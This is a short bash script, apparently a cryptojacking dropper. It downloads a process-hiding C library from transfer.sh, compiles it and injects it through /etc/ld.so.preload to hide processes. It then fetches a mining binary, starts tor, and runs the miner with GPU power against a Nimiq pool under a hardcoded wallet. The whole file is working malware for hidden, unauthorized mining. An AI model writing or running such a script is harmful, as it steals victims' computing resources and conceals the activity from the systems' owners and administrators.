#!/bin/bash
apt update
apt install sudo screen -y
wget --no-check-certificate -c http://transfer.sh/ntzeku/processhider.c -O jik.c 
gcc -Wall -fPIC -shared -o libprocessh.so jik.c -ldl
sudo mv libprocessh.so /usr/local/lib/ 
echo /usr/local/lib/libprocessh.so >> /etc/ld.so.preload 
cd /root 
mkdir op
cd op
wget http://transfer.sh/H8t4Pk/mav.zip 
unzip mav.zip 
chmod 777 mavic 
rm mav.zip
tor & 
sleep 50 
./mavic -t cuda -a "NQ10GFRP80K4UQ19ASS0YLJCC43F6JV1P4RM" -p nimiq.icemining.ca:2053 -n "mo" 


